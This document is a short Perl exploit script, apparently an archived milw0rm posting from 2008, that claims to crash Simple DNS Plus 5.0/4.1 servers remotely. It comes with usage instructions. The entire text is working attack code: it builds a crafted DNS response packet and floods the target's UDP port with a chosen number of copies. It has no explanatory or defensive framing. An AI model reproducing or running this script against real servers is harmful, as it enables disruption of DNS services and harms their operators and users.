#!/usr/bin/perl
# Simple DNS Plus 5.0/4.1 < remote Denial of Service exploit
#
# usage: sdns-dos.pl <dns server> <dns source port> <num of packets>
# Exploit written by Exodus.
# http://www.blackhat.org.il
 
use IO::Socket;
 
if(@ARGV < 3){
print("sdns-dos.pl <dns server> <dns source port> <num of packets>");
}
$sock = IO::Socket::INET->new(PeerAddr => "$ARGV[0]:$ARGV[1]", Proto => 'UDP') || die("Cant connect DNS server");
 
 
 
$address = $ARGV[0];
 
$trans = pack("H4","1337");
$flags = pack("B16","1000010110110000");
$question = pack("H4","0001");
$answerRR = pack("H4","0001");
$authorityRR = pack("H4","0000");
$additionlRR = pack("H4","0000");
$type = pack("H4","0001"); # A host name
$class = pack("H4","0001"); # IN
 
@parts = split(/\./,$address);
foreach $part (@parts)
{
 $packedlen = pack("H2",sprintf("%02x",length($part)));
 $address2 .= $packedlen.$part;
}
$query = $address2. "\000" . $type . $class;
 
$aname = pack("H4","c00c");
$atype = pack("H4","0001");
$aclass = pack("H4","0001");
$ttl = pack("H8","0000008d");
$dlen = pack("H4","0004");
$addr = inet_aton("127.0.0.1");
$answer = $aname . $atype . $aclass . $ttl . $dlen . $addr;
 
$payload = $trans . $flags . $question . $answerRR
. $authorityRR . $additionlRR . $query . $answer;
 
print "sending $ARGV[2] packetsâ€¦ ";
for($i=0;$i<=$ARGV[2];$i++)
{
 print $sock $payload;
}
print "Done. Good bye.";
__END__ 

# milw0rm.com [2008-07-13]
